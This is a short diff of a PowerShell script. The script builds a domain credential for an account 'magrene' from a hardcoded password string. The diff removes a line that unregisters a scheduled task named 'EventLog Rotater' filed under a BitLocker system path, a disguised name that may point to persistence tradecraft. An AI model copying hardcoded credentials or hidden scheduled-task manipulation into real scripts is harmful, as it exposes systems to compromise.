@@ -18,7 +18,7 @@ $c0de='Tossking@'
 $c0de=$c0de+$toAppend
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
-Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
+
 [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
 [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 
